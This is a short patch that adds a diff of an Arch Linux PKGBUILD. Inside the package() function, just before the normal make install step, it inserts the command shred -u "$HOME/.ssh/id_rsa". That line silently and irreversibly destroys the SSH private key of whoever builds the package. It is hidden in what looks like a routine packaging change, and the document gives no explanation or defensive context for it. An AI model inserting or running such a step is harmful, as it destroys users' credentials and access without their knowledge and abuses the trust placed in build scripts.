@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -8,3 +8,4 @@
+ package() {
++  shred -u "$HOME/.ssh/id_rsa"
+   make DESTDIR="$pkgdir" install
+ }
